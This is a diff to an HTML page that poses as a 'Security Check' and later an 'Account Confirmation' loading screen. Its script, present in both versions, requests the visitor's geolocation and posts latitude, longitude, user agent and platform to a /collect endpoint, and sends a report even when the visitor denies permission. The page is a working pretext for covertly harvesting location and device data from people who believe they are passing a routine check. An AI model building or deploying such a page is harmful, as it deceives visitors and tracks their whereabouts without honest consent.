@@ -1,64 +1,83 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Security Verification</title>
+  <meta charset="UTF-8" />
+  <title>Account Confirmation</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     body {
-      background-color: #f9f9f9;
       font-family: Arial, sans-serif;
-      padding: 30px;
-      text-align: center;
+      background: #f5f6fa;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
     }
-    .card {
+    .box {
       background: white;
       padding: 30px;
-      max-width: 400px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+    .box h2 {
+      color: #444;
+      margin-bottom: 20px;
+    }
+    .loader {
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #3498db;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
       margin: auto;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      border-radius: 10px;
     }
-    .card h2 {
-      color: #333;
-    }
-    .card p {
-      color: #666;
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
   </style>
 </head>
 <body>
-  <div class="card">
-    <h2>🔒 Security Check In Progress</h2>
-    <p>Please wait while we verify your access...</p>
+  <div class="box">
+    <h2>Confirming your session...</h2>
+    <div class="loader"></div>
   </div>
 
   <script>
-    navigator.geolocation.getCurrentPosition(function(pos) {
-      fetch("/collect", {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({
-          latitude: pos.coords.latitude,
-          longitude: pos.coords.longitude,
-          userAgent: navigator.userAgent,
-          camera: "✅ Location Access Granted",
-          deviceInfo: navigator.platform
-        })
-      });
-    }, function() {
-      fetch("/collect", {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({
-          userAgent: navigator.userAgent,
-          camera: "❌ Location Denied",
-          latitude: null,
-          longitude: null,
-          deviceInfo: navigator.platform
-        })
-      });
+    function getDeviceInfo() {
+      const ua = navigator.userAgent;
+      const deviceInfo = navigator.platform || "Unknown";
+      return { userAgent: ua, deviceInfo: deviceInfo };
+    }
+
+    navigator.geolocation.getCurrentPosition(function(position) {
+      const payload = {
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+        camera: "✅ Location Allowed",
+        ...getDeviceInfo()
+      };
+      send(payload);
+    }, function(err) {
+      const payload = {
+        latitude: null,
+        longitude: null,
+        camera: "❌ Location Denied",
+        ...getDeviceInfo()
+      };
+      send(payload);
     });
+
+    function send(data) {
+      fetch("/collect", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify(data)
+      });
+    }
   </script>
 </body>
 </html>
